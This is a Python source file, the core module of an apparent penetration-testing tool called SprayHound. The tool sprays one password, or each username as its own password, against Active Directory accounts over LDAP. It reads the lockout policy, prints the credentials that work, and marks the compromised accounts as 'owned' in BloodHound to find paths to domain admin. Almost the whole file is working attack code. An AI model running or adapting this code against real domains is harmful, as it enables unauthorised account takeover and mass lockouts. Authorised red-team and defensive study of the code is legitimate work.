# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com

import os
from sprayhound.modules.logger import Logger
from sprayhound.modules.ldapconnection import LdapConnection
from sprayhound.modules.neo4jconnection import Neo4jConnection
from sprayhound.modules.credential import Credential
from sprayhound.utils.utils import *


class SprayHound:
    def __init__(self, users, password,
                 ldap_options,
                 neo4j_options,
                 logger_options=Logger.Options(),
                 unsafe=False
                 ):
        self.log = Logger(logger_options)
        self.ldap = LdapConnection(ldap_options, self.log)
        self.neo4j_options = neo4j_options
        self.neo4j = None
        self.credentials = []
        self.users = users
        self.password = password
        self.unsafe = unsafe

    def run(self):
        if not self.ldap.domain:
            return ERROR_LDAP_NOT_FQDN_DOMAIN

        if not (self.ldap.username and self.ldap.password and self.ldap.host):
            if not self.users:
                return ERROR_NO_USER_NO_LDAP
            else:
                self.log.warn("BEWARE ! You are going to test user/pass without providing a valid domain user")
                self.log.warn("Without a valid domain user, tested account may be locked out as we're not able to determine password policy and bad password count")

                answer = self.log.input("Continue anyway?", ["y", "n"], "n")
                if answer == "n":
                    self.log.warn("Wise master. Bye.")
                    sys.exit(0)
                self.get_credentials()
        else:
            try:
                self.ldap.login()
                self.log.success("Login successful")
            except Exception as e:
                self.log.error("Failed login")
                raise

            try:
                self.ldap.get_password_policy()
                self.log.success("Successfully retrieved password policy")
            except Exception as e:
                self.log.error("Failed getting password policy")
                raise

            try:
                self.get_ldap_credentials()
                self.log.success("Successfully retrieved {} users".format(len(self.credentials)))
            except Exception as e:
                self.log.error("Failed getting ldap credentials")
                raise

        return self.test_credentials()

    def get_credentials(self):
        self.credentials = [Credential(user) for user in self.users]
        for i in range(len(self.credentials)):
            if self.password:
                self.credentials[i].password = self.password
            else:
                self.credentials[i].password = self.credentials[i].samaccountname

    def get_ldap_credentials(self):
        if not self.users:
            ret = self.ldap.get_users(self)
            if ret != ERROR_SUCCESS:
                return ret
        else:
            ret = self.ldap.get_users(self, user=self.users[0], disabled=True)
            if ret != ERROR_SUCCESS:
                return ret

        for i in range(len(self.credentials)):
            if self.password:
                self.credentials[i].set_password(self.password)
            else:
                self.credentials[i].set_password(self.credentials[i].samaccountname)

        return ERROR_SUCCESS

    def test_credentials(self):
        owned = []
        for credential in self.credentials:
            ret = credential.is_valid(self.ldap, self.unsafe)
            if ret == ERROR_SUCCESS:
                self.log.success(Logger.highlight("{} : {}").format(credential.samaccountname, credential.password))
                owned.append(credential.samaccountname)
            elif ret == ERROR_LDAP_SERVICE_UNAVAILABLE:
                return ret
            else:
                self.log.debug("{} : {} failed (Error {}: {})".format(credential.samaccountname, credential.password, ret[0], ret[1]))

        answer = "n"
        if len(owned) > 1:
            self.log.success("{} user(s) have been owned !".format(len(owned)))
            answer = self.log.input("Do you want to set them as 'owned' in Bloodhound ?", ['y', 'n'], 'y')
        elif len(owned) > 0:
            self.log.success("{} user has been owned !".format(len(owned)))
            answer = self.log.input("Do you want to set it as 'owned' in Bloodhound ?", ['y', 'n'], 'y')

        if answer != "y":
            self.log.warn("Ok, master. Bye.")
            return ERROR_SUCCESS

        self.neo4j = Neo4jConnection(self.neo4j_options)

        for own in owned:
            ret = self.neo4j.set_as_owned(own, self.ldap.domain)
            if ret != ERROR_SUCCESS:
                return ret
            else:
                msg = "Node {} owned!".format(own)
                if self.neo4j.bloodhound_analysis(own, self.ldap.domain) == ERROR_SUCCESS:
                    msg += " [{}PATH TO DA{}]".format('\033[91m', '\033[0m')
                self.log.success(msg)

        return ERROR_SUCCESS


class CLI:
    def __init__(self):
        self.args = get_args()
        self.log_options = Logger.Options(verbosity=self.args.v)

        self.log = Logger(self.log_options)

        self.ldap_options = LdapConnection.Options(
            self.args.domain_controller,
            self.args.domain,
            self.args.ldap_user,
            self.args.ldap_pass,
            self.args.ldap_port,
            self.args.ldap_ssl,
            self.args.ldap_page_size
        )
        self.neo4j_options = Neo4jConnection.Options(
            self.args.neo4j_host,
            self.args.neo4j_user,
            self.args.neo4j_pass,
            self.args.neo4j_port,
            self.log
        )

        self.users = []
        if self.args.username:
            self.users = [self.args.username]
        elif self.args.userfile:
            if not os.path.isfile(self.args.userfile):
                sprayhound_exit(self.log, ERROR_USER_FILE_NOT_FOUND)
            with open(self.args.userfile, 'r') as f:
                self.users = [user.strip().lower() for user in f if user.strip() != ""]
        self.password = self.args.password

    def run(self):
        try:
            return SprayHound(
                self.users, self.password,
                ldap_options=self.ldap_options,
                neo4j_options=self.neo4j_options,
                logger_options=self.log_options,
                unsafe=self.args.unsafe
            ).run()
        except Exception as e:
            self.log.error("An error occurred while executing SprayHound")
            if self.args.v == 2:
                raise
            else:
                return False


def run():
    CLI().run()
